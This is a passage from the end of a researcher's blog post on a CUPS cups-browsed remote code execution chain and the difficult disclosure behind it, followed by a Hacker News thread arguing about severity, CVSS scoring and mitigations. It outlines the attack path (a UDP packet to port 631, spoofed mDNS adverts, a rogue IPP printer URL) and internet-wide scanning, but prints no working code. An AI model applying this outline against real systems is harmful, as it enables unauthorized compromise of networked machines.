OpenPrinting cups-browsed repository and do what to me was the right thing to do: responsible disclosure. I won’t go into the details of the initial conversation, or the ones that followed. You are free to read them (if they will ever open any of the threads and you are willing to read 50+ pages of conversations) or not, and make your own opinion. While the research only took a couple of days, this part took 22. And this part was not fun. I will only say that to my personal experience, the responsible disclosure process is broken. That a lot is expected and taken for granted from the security researchers by triagers that behave like you have to “prove to be worth listening to” while in reality they barely care to process and understand what you are saying, only to realize you were right all along three weeks later (if at all). Two days for the research, 249 lines of text for the fully working exploit. Twenty-two days of arguments, condescension, several gaslighting attempts (the things i’ve read these days … you have no idea), more or less subtle personal attacks, dozens of emails and messages, more than 100 pages of text in total. Hours and hours and hours and hours and fucking hours. Not to mention somehow being judged by a big chunk of the infosec community with a tendency of talking and judging situations they simply don’t know. Let that sink in for a moment … WTAF. And we’re not talking about time spent on fixes while I was impatient and throwing a tantrum on twitter. The actual fixes (or a part of them) started being pushed much later. The vast majority of the time has been spent arguing whether or not these were issues worth considering. While I was trying to report that there’s something bad that should be addressed asap, the devs were being dismissive (and pushing other code, also vulnerable, for other functionalities instead of fixing) because I dared to criticize the design of their software. While at the same time I was trying to reach out privately to de-escalate and assure whoever was getting offended that my intent was not adversarial: To the people that more or less directly questioned my integrity, accused me of spectacularization and of spreading FUD on my socials: I don’t do this for a living. I don’t need CVEs to get a job or to prove how good my kung-fu is. Or any attention other than what my projects and research already provide. I don’t play InfoSec Influencer™ like many. To put it like Javier beautifully put it, my mission was to interrupt the triagers focus until they re-prioritized. When I saw that what I thought was pretty serious was being dismissed as an annoyance, I used the only platform I had plus a pinch of drama as a tool to have them fucking re-prioritize. And it worked, wonderfully, more fixes happened after two tweets than with all the arguing and talking, so 🤷. Don’t hate me, hate the system that forced me to do that in order to be taken seriously. About the 9.9 CVSS Somebody also accused of making things up, especially due to the 9.9 CVSS severity that I claimed in this tweet. Granted, as I very transparently said in the thread, I’m really not familiar with CVSS scores, how they are assigned and so on. But here’s a screenshot from the VINCE report of the initial CVSS scores, including the 9.9, being estimated by a RedHat engineer (and also reviewed by another one): As I said, I’m not an expert, and I think that the initial 9.9 was mostly due to the fact that the RCE is trivial to exploit and the package presence so widespread. Impact wise I wouldn’t classify it as a 9.9, but then again, what the hell do I know? By the way, CERT’s VINCE either has a backdoor, or an inside leak, or has zero vetting on who they add to a disclosure, because there’s been a leak of the exact markdown report that I only shared there, including the exploit. What a fucking circus. One More Thing When initially I wrote exploit.py, it only sent the UDP packet and created the rogue IPP server. Then with time I started adding features to it, especially zeroconf advertising, and it became a tool. So at some point I decided to rewrite it in Go and integrate this new code in bettercap, giving it the ability to transparently impersonate any service advertised via zeroconf / Bonjour / Avahi on a LAN and doing interesting things with the TXT records and specific service attributes, like IPP. And I discovered other interesting stuff :) In part II of this series (date TBD since there’s another disclosure in process), we’ll see how to use these new bettercap modules (not yet released) to attack Apple macOS. For now, I hope you enjoyed part I, hack the planet!",
    "commentLink": "https://news.ycombinator.com/item?id=41662596",
    "commentBody": "Attacking UNIX Systems via CUPS (evilsocket.net)403 points by NetBender 23 hours agohidepastfavorite301 comments Tiberium 22 hours agoWait, this is a joke, right? > A remote unauthenticated attacker can silently replace existing printers’ (or install new ones) IPP urls with a malicious one, resulting in arbitrary command execution (on the computer) *when a print job is started (from that computer).* (emphasis mine) There's no way this is 9.9 when Heartbleed was just 7.5... EDIT: Wanted to add why I think he has overblown this way too much. His original tweet stated \"* Unauthenticated RCE vs all GNU/Linux systems (plus others)\" but as we can see this isn't nearly the case as on a lot of distros CUPS only listens on loopback or isn't installed at all. Another point: > Full disclosure, I’ve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. And I’ve got back connections from hundreds of thousands of devices, with peaks of 200-300K concurrent devices If I'm understanding this correctly, he only found 300 thousand open CUPS instances in the whole public IPv4. Remember - the CUPS server needs to receive a print job in order for the RCE to happen, which I doubt most of these instances will get. reply crote 16 hours agoparentReading through this writeup I'd argue it's indeed quite bad, but more in the sense that the entire `cups-browsed` daemon should probably stop existing, and the Linux ecosystem should have a serious discussion about the future of CUPS in general. These bugs look surprisingly trivial, and upstream response to what is in the end still a fairly serious security issue isn't exactly what one would expect from an installed-by-default desktop Linux package. But no, it's definitely not worth the stop-the-world CVSS 9.9 panic. reply sam_lowry_ 13 hours agorootparentCUPS 3 goes the other way, relying solely on IPP for discovery and autoconfiguration. reply yrro 3 hours agorootparentprev> the entire `cups-browsed` daemon should probably stop existing It's a legacy component that you don't need with modern printers - cups itself only support IPP Everywhere (printer discovery via mDNS) these days. reply seanhunter 21 hours agoparentprevTo give the author full credit, they say > Impact wise I wouldn’t classify it as a 9.9, but then again, what the hell do I know? reply rini17 22 hours agoparentprevThere are also buffer overflows exploitable without any user action. The foomatic vector which requires print job was just one easiest to scan and exploit. reply Tiberium 22 hours agorootparentThanks, I missed that. But that still leaves us with only 300 thousand exploitable instances in the whole public IPv4 address space. This is nowhere near a universal GNU/Linux RCE. Of course it's still a big deal to those affected servers, but it's nowhere near even RegreSSHion. reply tsimionescu 12 hours agorootparentNo, the author said that the peak concurrent connections was 300k. That tells us there are at least that many vulnerable hosts publicly exploitable, but there could be many more that are transiently exploitable. Also, this attack is easily triggered from any LAN, such as an airport or university or corporate or coffee shop network. And it is persistent: the attacker persistently registers a \"printer\" on your system (potentially overwriting a real printer that you actually have), and later when you print, even disconnected from the internet, you can trigger the RCE. reply nickphx 11 hours agorootparentEhh most public wifi spots segment clients... You will be unable to send traffic to neighbors... reply tsimionescu 10 hours agorootparentIf it's an open network, and there are still quite a few of those, it's not hard to broadcast packets over the air and fool the receiver into thinking they're coming from the connected AP. reply mschuster91 10 hours agorootparentprevMost run by commercial enterprises do, because they have teams running them that care about security. Your average non-large-brand coffee shop or ho(s)tel? They stick some cheap ass router in and disable the wifi password to get a public wifi for their guests. reply forgotpwd16 4 hours agorootparentReminds me when used to redirect or/and replace images on sites in cafés with zANTI. reply nullindividual 21 hours agorootparentprevThat's nearly as many as Code Red and roughly 100K more than SQL Slammer. reply chupasaurus 18 hours agorootparentAdd every macOS-running device to the picture (who disables cupsd?)... reply sitharus 15 hours agorootparentMy mac right now running Sonoma 14.6.1, with no system modifications or MDM: ≻ ps auxgrep -i cups xxxxx 31407 0.0 0.0 410741456 1600 s000 S+ 3:18pm 0:00.01 grep --color=auto -i cups cupsd is not running. If I go to print something cupsd will start up, and after a while of idle it'll shut down again. reply pxc 12 hours agorootparentThe socket activation thing it has with systemd as well, but I don't know if there are facilities for automatically shutting it down like that as well. That's a nice touch, and it'd be cool if Linux distros added that. reply naming_the_user 14 hours agorootparentprevSame here. Also, using netstat for the PID you can see that it's only listening on localhost ipv4/ipv6. reply pxc 12 hours agorootparentprevCUPS is also part of iOS and iPadOS. reply formerly_proven 10 hours agorootparentIf those ship cups, why do they require special AirPrint-compatible printers? reply pxc 10 hours agorootparentI dunno. I assumed that > The standards-based, open source printing system developed by Apple for iOS®, iPadOS®¹ ships on iOS® and iPadOS®. But maybe it doesn't. ¯\\_(ツ)_/¯ In seriousness, exposing only a very limited interface to a flexible, capable system seems to me very on-brand for Apple. Maybe they don't iOS and iPadOS to be of the kind of platform where one thinks about drivers, even if exposing CUPS features to users would let users accomplish more without much trouble. Or maybe they see printer drivers as essentially a legacy feature in the face of a 'driverless' future. Not my cup of tea, but both seem like things leaders at Apple would do/think. -- https://www.cups.org/ reply cowsandmilk 16 hours agorootparentprevGenerally, CUPS on a Mac is bound to localhost. It is highly atypical for a Mac to make it so any computer on the internet or even local network can make requests to its cups server. reply tsimionescu 12 hours agorootparentThe problem isn't CUPS itself, it's the automatic printer discovery mechanism. That's cups-browsed on Linux, not sure how it's achieved on a Mac. And the printer discovery service can't be firewalled: by definition, it has to listen for outside connections to be in any way useful. This is where things like Windows' trusted VS untrusted networks make sense: it's perfectly nice to allow printers to register to your system on your home network, it's a horrible idea when you connect to an airport wifi. reply nullindividual 15 hours agorootparentprevmacOS has a firewall on by default. reply tsimionescu 12 hours agorootparentThat doesn't help if the goal is to allow printers to register automatically to your system. reply cjbprime 21 hours agorootparentprevAre you sure? E.g. the blog post mentions a one-byte read overflow, which is unlikely to be directly exploitable. reply rini17 21 hours agorootparentIt also mentions: > I can tell you that there’re other, more easily exploitable code paths going on, not just in the discovery mechanism - also reported and ignored. To this day they have not been acknowledged or patched. reply H8crilA 7 hours agoparentprevHeartbleed is a memory leak, this is a full RCE without user action - RCE obviously implies full information leakage, and more. Specifically the execution is delayed until the next time a user uses their own printer (which config has been substituted by the attacker). And the vulnerability is in cupsd-browser, not cupsd. The author may have some attitude problem, but this is a legit Big Deal vulnerability. reply tga_d 3 hours agorootparentIt's RCE (as the lp user, if I'm not mistaken) with user action, and only if the firewall isn't blocking required ports. Most systems, even most systems with CUPS installed, never print anything. The number of systems with no firewall (where \"firewall\" here could just be NAT) that actually print something is even smaller. reply ezekg 21 hours agoparentprev> Wait, this is a joke, right? Not gonna lie, I died laughing at the \"Look at me, I'm the printer now\" meme. So in a way, it did have a good joke regardless of how you rank severity. reply Fnoord 19 hours agoparentprevApparently there are 300k people in the world who decided they need to have their printer available to the whole internet. It does not make sense, at all, but here we are. I suspect a lot of printers are going to be vulnerable with no patches in sight, but... these should only be available via LAN. Which is still an issue, but less so than it seems. reply tsimionescu 13 hours agorootparentIt's not that. Apparently, several major Linux distros, and the cups-browsed developers, have decided for people that any device on the internet should be able to connect to their system as a printer. reply pxc 15 hours agorootparentprevThe I in IPP stands for 'Internet'. I guess some people really mean it. reply a96 11 hours agorootparentprevOr, there are a whole lot of sites running honeypots. But it's still probably a very large number. reply gmuslera 17 hours agorootparentprevMaybe some may fall into the IOT/Embedded category. Wouldn't be very surprise if i.e. a cheap wifi camera have cups installed just because and jumps out in this scan. reply voytec 22 hours agoparentprevFrom the last image in the article: > 3. Command execution (cups-browsed, cups-filters): 9.9 > CVSS:3.1/AV:C:L/PR:N/UI:N/S:C/C:L/I:H/A:L - CWE-94 reply Arch-TK 5 hours agorootparentThis is strictly a miscalculation/fudge. In isolation (which is what CVSS is all about) this is not a network exploitable vulnerability, even if you can craft an attack chain which exploits it over the network. So: AV:N -> AV:L - reason above AC:L - correct PR:N -> PR:L - to exploit this you need to get cups to process a PPD file. Ignoring how it got there, writing a PPD file requires low privileges on the local machine (unless I'm wrong and you can't add a printer to cups as a local user by default, in which case this becomes PR:H with an overall score of 7.7). These might be fulfilled by another component of the attack chain, but again, you need to strictly think in terms of the vulnerability in a vacuum. UI:N -> UI:R - that a user must perform a task after you begin exploitation in order for the exploit to complete is a classical example of required user interaction S:C - correct, attacking cups and getting root on the whole machine is considered a scope change C:L -> C:H - Running arbitrary code as root on a machine is a total breach of all confidentiality of the local machine, so not sure why this was marked as low. I:H - correct A:L -> A:H - Running arbitrary code as root on a machine lets you do anything to completely disable it permanently. Availability impact is high. In summary a score of 8.2 (CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H) for CVE-2024-47177 in a vacuum. reply dfc 21 hours agorootparentprevBut it seems like User Interaction is required. reply tsimionescu 12 hours agorootparentPrinting something at some point arbitrarily later on the system is almost certainly not classed as User Interaction in this sense. reply Tiberium 22 hours agorootparentprevYeah, I guess you're right, for CUPS it might be 9.9. My other added points about it being a vastly overblown exploit still stand. reply Arch-TK 5 hours agoparentprevCVSS scores are meaningless in a vacuum, and in this case it seems the redhat person who calculated them took the \"fudge it until it looks bad\" approach. Below is my professional scoring evaluation while trying to keep to the ideas behind CVSS and the spec as much as I can. Although CVSS is used so rarely in my work (as it usually inappropriate) that I may have made some miscalculations. CVE-2024-47176 5.3 CVSS:3.1/AV:C:L/PR:N/UI:N/S:U/C:L/I::N CVE-2024-47046 4.3 CVSS:3.1/AV:C:L/PR:N/UI:R/S:U/C:N/I:L/A:N CVE-2024-47175 3.3 CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N CVE-2024-47177 8.2 CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H If I apply the same exact approach to scoring Heartbleed I get: 7.5 CVSS:3.1/AV:C:L/PR:N/UI:N/S:U/C:H/I::N The key differences between Heartbleed and the final code execution issue in the attack chain are that Heartbleed is directly over the network (in a vacuum) whereas the code execution is entirely local (in a vacuum, ignoring the previous elements of the attack chain, assuming they were themselves fixed). Additionally with heartbleed there is no user interaction required which also raises the score. But conversely, the direct impact of heartbleed (ignoring what you can do with the information) is that it is only a confidentiality impact (although you could argue that it can lead to a crash which would be a low availability impact bringing the score up to 8.2). I don't think this clarifies much about the scores but hopefully you can see why CVSS scores are meaningless without any context. You need to put them in the context of the environment. The other problem is that in an attack chain, the overall outcome might be bad even if all the individual issues score low. But CVSS doesn't apply to attack chains. At the end of the day, this is a high risk issue (you say many distros have cups listen on loopback, but I think this is not true, 631 tcp is indeed loopback only, but 631 tcp is in fact commonly bound to 0.0.0.0) but only in the context of your laptop which you happen to connect to untrusted networks without a firewall. In summary: This problem as a whole primarily affects desktop systems and some servers. Device running cups exposed to the internet: Critical Device running cups connected to untrusted (but local/non internet routable) networks: High Device running cups connected to trusted networks: Medium reply that_guy_iain 20 hours agoparentprev> There's no way this is 9.9 when Heartbleed was just 7.5... There are tons of 10s and for, what are IMO, really silly things. reply worthless-trash 13 hours agoparentprevHeartbleed was a different CVSS version. reply znpy 21 hours agoparentprevThe whole thing looks severely overstated. If i was in bad faith i'd say the guy is looking for fame. I wonder, has the guy tried reproducing the exploit on RHEL/Fedora or some other SELinux-protected system? Because this looks like the kind of issue that SELinux would protect you from: 1. cups likely does not have permissions to go and write executable binary files around 2. cups likely does not have permissions to go and exec binaries without the appropriate labels If that's the case, this would really be a testament to SELinux and the final blow to AppArmor or whatever Canonical is shipping nowadays (clearly useless). I still think that maybe you could steal printing document, but i haven't tried. Anyway, i see there's plenty of CUPS-related selinux work documented via manpages. Example: https://www.systutorials.com/docs/linux/man/8-cupsd_selinux/ reply mort96 11 hours agorootparentRed Hat is the company which first assigned a score of 9.9 fwiw, I think they would've mentioned if it didn't affect RHEL/Fedora? reply Fnoord 18 hours agorootparentprevEvilsocket is a known hacker. They made for example Bettercap (Pwnagotchi), Opensnitch, and a myriad of other tools. They don't need fame. reply jsiepkes 13 hours agorootparentPeople who already have some level of fame often feel pressure to keep meeting \"expectations\". reply shrubble 19 hours agorootparentprevThe first thing many do in the real world, after installing RHEL or the free derivatives is ... turn off SELinux. reply yrro 3 hours agorootparentIf you want to get fired, sure! reply worthless-trash 13 hours agorootparentprevIt is a great way to show which people care about security. I equate (and I am likely not alone) that this would be a modern equivalent of chmod -R 777 / in early Unix computing. Use of AppArmour/SElinux is probably a good filter during an interview to determine if a person is a good fit for a security conscious position. reply iforgotpassword 12 hours agorootparentHard disagree. FS permissions take like 5 minutes to explain and then you maybe need another 30 minutes in total to try around and get a hang of it. I've given up on selinux every time I've tried to make sense of it. Open 3 different tutorials, have 3 totally different approaches to it. I guess if you only install core packages on redhat and never touch a single config file it might work OK even for the average Joe. reply TheNewsIsHere 11 hours agorootparentI found that for me, SELinux is best mastered by reading the documentation. Most tutorials I read when trying to make custom policies and monitor how policies were working, were hot garbage written by people who were just reading other people’s tutorials. SELinux solves problems orthogonal to FS permissions, and use cases that FS permissions alone don’t address. It was a bit tough at first but writing your first SELinux profile is a fantastic way to make it approachable. YMMV, of course. reply ungamedplayer 8 hours agorootparentprevI guess I must be wrong. So many people disagree with me I must be an idiot. You can write and understand llms but not selinux policies.. You are right, the crowd has spoken. Thank you for the education hn. reply znpy 5 hours agorootparentprev> The first thing many do in the real world, after installing RHEL or the free derivatives is ... turn off SELinux. The people with port 631 publicly reachable didn't configure their firewall either (neither at OS level nor at infrastructure level) so what now, firewalls are useless? reply anthk 17 hours agorootparentprevCups needs permissions for Foomatic and some printing filters. reply dumpsterdiver 20 hours agorootparentprevAre you suggesting that people should not report remote command execution vulnerabilities when such vulnerabilities are successfully stopped by SELinux? Also, why do you think that seeking recognition for your efforts a bad thing? reply znpy 20 hours agorootparent> Are you suggesting that people should not report remote command execution vulnerabilities when such vulnerabilities are successfully stopped by SELinux? No, I'm suggesting that only testing on system shipping weak protection systems and poor defaults is misleading. > Also, why do you think that seeking recognition for your efforts a bad thing? It isn't by default, but it can become a bad thing when you overstate the importance of your finding: see my previous line in this comment and add the fact that this guy picked a cve score of 9.9 where heartbleed had \"only\" a 7.5 score -- but heartbleed affected pretty much everybody in the industry. reply outworlder 20 hours agorootparent> But here’s a screenshot from the VINCE report of the initial CVSS scores, including the 9.9, being estimated by a RedHat engineer (and also reviewed by another one) > As I said, I’m not an expert, and I think that the initial 9.9 was mostly due to the fact that the RCE is trivial to exploit and the package presence so widespread. Impact wise I wouldn’t classify it as a 9.9, but then again, what the hell do I know? He did _not_ pick the score. reply dumpsterdiver 19 hours agorootparentprev> No, I'm suggesting that only testing on system shipping weak protection systems and poor defaults is misleading. But then he would not have found and reported the vulnerability, yet it would still exist and affect people. Once the vulnerability was discovered it doesn’t matter if one operating system or the other has protections in place that will stop it. What matters is that the code is vulnerable and that there are people who are not protected. Proving that it is not exploitable on systems configured a certain way does not invalidate the original finding. reply RGBCube 22 hours agoprevAnyone exposing CUPS to the internet is living a level of not giving a fuck that CVEs cannot reach. reply DanMcInerney 22 hours agoparentIt appears that the vulnerable service in question listens on 0.0.0.0 which is concerning, it means attacks from the LAN are vulnerable by default and you have to explicitly block port 631 if the server is exposed to internet. Granted, requires user to print something to trigger which, I mean, I don't think I've printed anything from Linux in my life, but he does claim getting callbacks from 100's of thousands of linux machines which is believable. reply btown 22 hours agorootparentIf you're vulnerable to attacks from the LAN, you're vulnerable to your wi-fi router (or your coffee shop/workplace's router) being compromised, which is quite common; see e.g. https://www.bleepingcomputer.com/news/security/mirai-botnet-... and https://blog.lumen.com/the-pumpkin-eclipse/ Assuming that most routers are silently compromised, with their command-and-control operators just waiting for an exploit like this one, is almost par for the course these days! reply runjake 21 hours agorootparentThe problem: you're thinking in terms of home/small business networks. The rest of us are thinking in terms of larger networks (in my case with hundreds of subnets and tens of thousands of nodes) where \"631 is blocked at the firewall\" isn't of much relief. The firewall is merely one, rather easy to get past, barrier. We're also concerned with east/west traffic. reply btown 20 hours agorootparentFor sure, and sending hug-ops to teams like yours that have to deploy & enforce mass patches! But I'm also thinking of environments that don't even have the benefit of a team like yours. https://issuetracker.google.com/issues/172222838?pli=1 is (or seems to be?) a saving grace, without which every school using Chromebooks could see worms propagating rapidly if even one student connected to a compromised router at home. reply runjake 4 hours agorootparentFWIW, my team is me and maaaybe 30% of another guy, but point noted. :-) reply graemep 9 hours agorootparentprevWould you also not block this at the firewall on individual nodes: if you block incoming incoming UDP on port 631 that would at least eliminate one of the two entry points, right? There is no detail in the article about the other. reply tsimionescu 8 hours agorootparentThe port has to be open on the node for the functionality to work - the whole point is that printers on the same LAN can auto-register. If you don't want that, disabling cups-browsed is much safer than just relying on the firewall. If you do want that, you can't firewall the port at all. reply gordonfish 22 hours agorootparentprevThis is why on public servers I block everything inbound and only allow specific needed services through. reply eikenberry 22 hours agorootparentprevWhich distro do you see Cups listening on 0.0.0.0? On Debian (at least, only one I have handy) it only listens on localhost. [edit: I was wrong, it listens on 0.0.0.0 for UDP. I was only checking TCP. ] reply mikepavone 22 hours agorootparentOn my Ubuntu 22.04 machine, cupsd itself is only listening on localhost, but cups-browsed (which is what has the vulnerability here) is listening on 0.0.0.0 reply raverbashing 22 hours agorootparentWhy does it even listens in UDP at this day and age?! reply yrro 3 hours agorootparentThe purpose of cups-browsed is to listen on a UDP port which allows it to receive broadcasts from legacy cups servers on the local network, whereupon it will talk to cups and configure a local print queue for the printers on the discovered server. A modern setup doesn't need it and doesn't use it. reply mikepavone 22 hours agorootparentprevI believe it's implementing DNS-SD for network printer auto-discovery. I'm not terribly familiar with DNS-SD, but given that normal DNS is UDP based it would be unsurprising for DNS-SD to also use UDP. reply ahoka 20 hours agorootparentDNS is actually UDP/TCP. It’s probably required for receiving unicast messages, if it’s using DNS-SD reply ahoka 20 hours agorootparentprevTo receive multicast messages, probably. reply bonzini 22 hours agorootparentprevOpenSUSE But it looks like cups-browsed is only needed on the Internet; locally you only need mDNS. reply tsimionescu 12 hours agorootparentmDNS doesn't allow the printer to register itself to your system, which is the (highly dubious!) purpose of cups-browsed. reply yrro 3 hours agorootparentModern cups discovered printers via mDNS and does indeed automatically create temporary destinations for them. This only works with \"IPP Everywhere\" printers which are 'driverless', i.e., the risk of doing this is limited since there's no printer model-specific software that needs to be run on the local machine to print to a remote printer, as opposed to the legacy protocol implemented (apparently unsafely!) by cups-browsed. reply rini17 22 hours agorootparentprevMX Linux reply cp9 22 hours agorootparentprevon popOS I see 0.0.0.0:* I'm not sure why it deviates from Debian and Ubuntu which its based on though reply jeffbee 22 hours agorootparentThat's the wrong column of netstat output, I think. \"0.0.0.0:*\" stands in for the (non-existent) peer address of a listening port. reply cp9 22 hours agorootparentoh sorry yeah I copied the wrong column. the correct column is `0.0.0.0:631` reply bongodongobob 22 hours agorootparentprevWho doesn't block all unneeded ports on an internet facing server or have it behind a firewall of some sort? reply bshipp 22 hours agorootparentI guess the important question is whether or not these things are blocked by default or require user intervention to disable cups? Sure, many of us block all ports by default and either route everything behind a reverse proxy or punch very specific holes in the firewall that we know are there and can monitor, but someone firing up an ubuntu distribution for their first foray into linux is probably not thinking that way. reply bongodongobob 22 hours agorootparentWell lots of people crash 600HP cars right after they buy them. If you haven't done your homework, you'll learn quickly. reply bshipp 22 hours agorootparentThe people who are crashing their 600HP Linux systems are, unfortunately, not the ones who are reading CVE listings in their spare time. Canonical and other distros are probably going to have to patch that default setting. reply bongodongobob 21 hours agorootparentYou don't need to read CVEs to turn on your fucking firewall. It's in every single how to set up a server for dummies tutorial I've ever seen. reply sgc 19 hours agorootparentThere are a lot of comments on here that assume Linux is only for servers. But just recently there was a post on HN indicating Linux will likely hit 5% desktop share for the first time this year. That's a lot of people on Linux - and a far higher percentage of people using Linux on the desktop will not know anything about this. Sane defaults should not be a luxury. Of course people should know to wear their seatbelts, but seatbelt alarms are still a very good thing. Sent from my Ubuntu laptop. reply Ekaros 13 hours agorootparentAnd this is why Microsoft force pushes updates. I think when Linux desktops become really popular there is quite a worry if the users simply do not update them regularly enough. Or if they are not secured in most ways by default. reply RGBCube 22 hours agorootparentprevI'm pretty sure all major distros configure it to listen locally instead. reply mikepavone 21 hours agorootparentcupsd is configured to listen locally, but cups-browsed has to listen on the network to do its job (network printer auto-discovery) reply gordonfish 20 hours agorootparent> but cups-browsed has to listen on the network to do its job (network printer auto-discovery) Isn't listening on 0.0.0.0 instead of localhost only needed if the machine itself is hosting a printer that needs to be accessible to other hosts? reply mikepavone 18 hours agorootparentI am very unfamiliar with the protocol, but my impression from a little reading is that the sharing computer broadcasts and the receiver listens. This appears to be for some CUPS specific browsing/discovery protocol rather than mDNS/DNS-SD (cups-browsed supports adding printers discovered that way but depends on avahi to handle the mDNS part). EDIT: Here's a description of the protocol in question: https://opensource.apple.com/source/cups/cups-327/cups/doc/h... reply tsimionescu 13 hours agorootparentprevNo, per the article, cups-browsed is used so that a printer can register itself to your system. The printer is the one that initiates a connection to tell your system that it is available at some URL. reply eadmund 16 hours agoparentprevIt sounds like in this case “exposing CUPS to the Internet” means “running a Linux desktop on the Internet” which while not something I would do doesn’t seem crazy. I would hope that a default Debian desktop installation would be secure enough to set up without a firewall. I certainly expect that a Linux laptop shouldn’t be highly vulnerable to every other device on, say, an æroport’s WiFi. reply johnklos 20 hours agoparentprevAnyone going to a coffee shoppe and using a public wifi is exposing CUPS and can be exploited. Simple minded dismissal doesn't help anyone. reply gordonfish 17 hours agorootparentHonestly, this is why firewalls exist. This really isn't problem for anyone with basic computer hygiene. reply zanecodes 14 hours agorootparentThe prevalence of attitudes like this in the Linux community is why the year of the Linux desktop will never come. Imagine if your brand new refrigerator, by default, would leak toxic refrigerant into your kitchen unless you adjusted a valve just so. This fact is not called out prominently in the manual, but if you read the fine print in the manufacturer's assembly instructions and have a working knowledge of how a refrigerator operates, you can maybe infer that this valve must be adjusted after purchase to prevent leakage. You go on their support forum to try to figure out why your brand new refrigerator is emitting toxic refrigerant, and you're essentially called an idiot and told you don't have \"basic refrigerator hygiene.\" People don't want to become refrigerator mechanics. They want cold food. reply abhinavk 14 hours agorootparentprevWhy isn't the firewall on by default on desktop systems? reply m4rtink 8 hours agorootparentIt is ? At least on Fedora Workstation for example, Firewall (controlled by firewalld) is installed and enabled by default. reply yrro 3 hours agorootparentBear in mind that the default FedoraWorkstation firewalld policy does not protect TCP/UDP ports >= 1025. Fortunately, in this case, cups-browsed uses port 631/udp :) reply snickerer 9 hours agorootparentprevBecause you don't need a firewall on a sensibly configured desktop computer. If you have daemons that listen to incoming connections, you only want to run them if they are sane and secure. A firewall makes sense when you don't trust the daemons in your lair, eh, network, and you don't have the possibility to replace insecure stuff with secure stuff. But a firewall must be maintained by experts. For a single computer it is much easier: just make sure it is secure and don't add an extra layer of complexity to it. reply acdha 7 hours agorootparentThat attitude was popular in the 90s but any definition of “sensibly configured” in this century involves a firewall. The reason is that even experts make mistakes, get busy, or rely on assumptions which turn out to be incorrect. For example, you thought your service which uses strong authentication and encryption was safe to expose – and then Heartbleed or RegreSSHion happened. If you restricted ingress, you slept calmly. If you had it open, you had an emergency rush to patch and look for signs of compromise. reply amluto 22 hours agoparentprevAnd, for some utterly and completely absurd reason, CUPS runs as a system daemon instead of a highly sandboxed user program. reply edelbitter 21 hours agorootparentOn Ubuntu, both. A system daemon with interesting interactions with avahi-daemon and colord, and a somewhat sandboxed user program, just so Chrome is not overly inconvenienced by its snap sandboxing. But wait, there is more: The login & lock screen also runs the whole glory of GNOME.. to query printer settings. So you can have those sweet, sweet \"new printer\" notifications overlaid while inputting your password. Or whatever else \"your\" printer needs to add there. reply jmclnx 1 hour agorootparentFWIW, on OpenBSD, cups-browsed is not on my system, but there are some cups files. But cups-browsed is installed when you install packages \"net/avahi\" and \"print/libppd\" which I do not know what either of them are. So I guess on Linux avahi needs cups-browsed. reply throwanem 22 hours agorootparentprevIt's a spooler for a printing system that supports concurrent job submission, potentially among multiple users. It's going to have to achieve serialization some kind of way. reply amluto 14 hours agorootparentI have never, in the entire history of my usage of desktop systems, wanted my system to spool out a print job on behalf of a non-current user. Nor have I wanted my system to continue servicing my print queue after I log out. To the contrary: it’s incredibly annoying when the queue glitches out and then my print jobs show up in the printer tray after I’ve left. On multi-user systems (accessed simultaneously by multiple interactive accounts), sure, I’ve once worked in a lab where multiplexing a printer would make sense. Make this a non-default option, please. And have a printer multiplexing daemon, not an entire shared monstrosity like CUPS. On terminal-server style systems, the print system should be per user, because the printers are per user. I don’t want to print to a printer wherever the terminal server lives — I want to print to the printer near me. I once ran an actual print server for a couple years. It did accounting, correctly, by wiring CUPS to a little program I wrote that actually spoke PJL correctly. CUPS, of course, can’t actually do this. reply aftbit 22 hours agorootparentprevWhy does it need to run as `root` user and not `cups`? reply throwanem 22 hours agorootparentAs long as that user can talk to the printers' device nodes (and/or the network), it needn't so far as I know. The original \"system daemon vs. user program\" dichotomy offers a much broader range of interpretations than this, though, and it was more the implication of \"this can and should be an evanescent program invoked by individual users, implicitly persisting little or no state between invocations\" to which I sought to object. (That said, I take another nearby commenter's point regarding the need, and existence, of a more evanescent and safer option on systems that will never see more printing than one user does two or three times a year.) reply yrro 3 hours agorootparentprevI believe these vulnerabilities only allow RCE as the 'lp' user (which is able to access parallel ports and USB devices that identify themselves as printers). In addition the process will be confined by MAC policies (e.g., on Fedora/Red Hat I think they're confined by cupsd_t). reply stevekemp 16 hours agorootparentprevBinding to ports under 1024 traditionally requires root privileges. (These days of course that isn't quite as true as it used to be.) reply ronjakoi 13 hours agorootparentIt's common practice to open the socket to start listening on thepretty much only got patronized because the devs just can't accept that their code is crap - responsible disclosure: no more. I can think of another reason they got patronised. reply evilos 14 hours agorootparentprevThey claim to not be a cybersecurity pro reply RGBCube 22 hours agorootparentprevNon-loginwalled link: https://threadreaderapp.com/thread/1838169889330135132.html reply NavinF 22 hours agorootparentprevYeah tbh it's not as bad as he claimed. I doubt this is actually rated 9.9: >A remote unauthenticated attacker can silently replace existing printers’ (or install new ones) IPP urls with a malicious one, resulting in arbitrary command execution (on the computer) when a print job is started (from that computer). >WAN / public internet: a remote attacker sends an UDP packet to port 631. No authentication whatsoever. >LAN: a local attacker can spoof zeroconf / mDNS / DNS-SD advertisements (we will talk more about this in the next writeup ) and achieve the same code path leading to RCE. Still, sucks for linux desktop users. Looks like any random device on your wifi/vpn can screw you over reply floren 22 hours agorootparentOr any malicious user on the airport wifi. The compromise will linger until however many weeks later when you decide to print something... reply bremac 22 hours agorootparentKeep in mind that you still need send a print job to the fake printer to trigger the exploit. If you send the job to your real printer, nothing happens. reply crote 16 hours agorootparentThe exploit allows an attacker to overwrite your real printer with their fake printer. reply graemep 9 hours agorootparentprevNot using the \"WAN\" attack if you are using a firewall config that stops that on public wifi. I do not understand how the mDNS entry point works. reply rolph 22 hours agorootparentprevi knew there was a reason i blacklist unsolicited/unauthenticated UDP inbound. reply jesprenj 13 hours agoprevI panicked a little when I heard the news as I run a cupsd open on the Internet. But as it turns out, the issue is misrepresented in headlines, just like here. This is not an issue in the core cupsd, but in a separate package/component, called cups-browsed. My distribution of choice for servers, Gentoo Linux, ships cups-browsed in a separate package which I had not installed, meaning I, as well as most other cups users that did not install this additional package, am not affected by this bug. Saying that all systems running cups can be hacked is a misrepresentation of the scale of the issue. reply iforgotpassword 12 hours agoparentI've always disliked how on Debian, usually being rather conservative, cups-browsed gets pulled in by default if you install cups. I think \"no install recommends\" fixes that, but iirc some add-ons like that hplip driver pull it in again. In my home setup I just disabled the 